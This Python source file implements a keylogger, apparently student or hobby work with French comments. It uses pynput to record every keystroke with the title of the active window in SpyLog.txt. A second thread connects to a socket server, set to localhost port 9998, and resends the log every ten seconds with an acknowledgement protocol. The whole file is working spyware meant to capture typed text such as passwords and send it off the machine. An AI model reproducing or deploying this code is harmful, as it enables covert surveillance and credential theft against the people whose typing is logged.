from pynput import keyboard
from datetime import datetime
from multiprocessing import Process
import threading
import platform
import pygetwindow as gw
import socket
import time
import sys #sys.exit()

host, port = ("localhost", 9998)
today = datetime.now()

def closeKlg():
    time.sleep(600)

#def srvStatus():    

def socketConnection(host, port, today): #faire une fonction qui fait s'écouler 10min, au bout de ces dix minutes le programme s'arrete
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            client.connect((host, port))
            # shutdown_listener = threading.Thread(target=bServerShutdown, args=(client,))
            # shutdown_listener.start()
            sendFile(client, today)
            break
        except :
            print(f"Le serveur ne répond pas, tentative de reconnexion ...")

def sendFile(client,today):
    while True:
        print("sending...")

        time.sleep(10) 
        file = open("SpyLog.txt", "rb")
        now = today.strftime("%Y_%m_%d %H-%M-%S")
        client.send(f"{now}-keyboard.txt\n".encode())
        data = file.read()
        client.sendall(data)
        client.send(b"<END>")

        file.close()
        print("end of sending !")
        try:
            ack = client.recv(1024).decode()
            if ack == "ACK":
                print("ACK reçu, envoi du nouveau fichier")
            else:
                print("ACK non reçu, renvoi du fichier")
                continue
        except socket.error as e:
            print(f"Erreur de socket : {e}")
            break
    client.close()
    #client.close()
    #return true    
    #except
    #return false
    #si sendFile renvoit false et que srvStatus renvoie vrai = le serveur n'est pas joignable alors fin

def bServerShutdown(client):
    while True:
        try:
            message = client.recv(1024).decode()
            if message == "<SERVER_SHUTDOWN>":
                print("Fermeture du serveur")
                break
        except socket.error as e:
            print(f"Erreur lors de l'écoute de la fermeture : {e}")
            break
    client.close()
    sys.exit()

def appNow():
    app_now = str(gw.getActiveWindow())
    app_now = app_now.split('=')[-1]
    app_now = app_now.rstrip('>')
    return app_now

def appInFile():
    try:
        with open("SpyLog.txt", "r")as file:
            app_file = file.readlines()[-1]
            app_file = app_file.split("->")[-1]
            app_file = app_file.rsplit("\n")[0]
            app_file = app_file.lstrip(" ")
        return app_file
    except:
        app_file = appNow()
        return app_file

def on_press(key):
    try:
        app_now = appNow()
        writeFile('{0}'.format(key.char), app_now)
    except AttributeError:
        app_now = appNow()
        writeFile('{0}'.format(key), app_now)

def delCharInFile():
    with open("SpyLog.txt", "r+", errors="ignore") as file:
        lines = file.readlines()
        file.seek(0)
        file.truncate()
        file.writelines(lines[0:-1])

def writeFile(key, app):
    if "Key.space" in key:
        key = " "
    if "cmd" in key:
        if "Windows" in platform.uname():
            key = f"Key.win"   
    if "Key.backspace" in key:
        delCharInFile()
    else:
        with open('SpyLog.txt', 'a', encoding="utf-8") as log:
            app_file = appInFile()
                
            if app != app_file:
                log.write("\n")
                
            log.write(f"{key} -> {app}\n")

def launchKeyLogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == '__main__' :
    srv_skt = threading.Thread(target=socketConnection, args=(host, port, today))#Process(target=socketConnection, args=(host, port, today))
    klg = threading.Thread(target=launchKeyLogger)#Process(target=launchKeyLogger)
    klg.start()
    srv_skt.start()

    klg.join()
    srv_skt.join()

"""
Comment gérer la reception de la string ? Process ?
Il faut que le programme continue de tourner et en même temps qu'il check constament si il string est envoyé ou pas
"""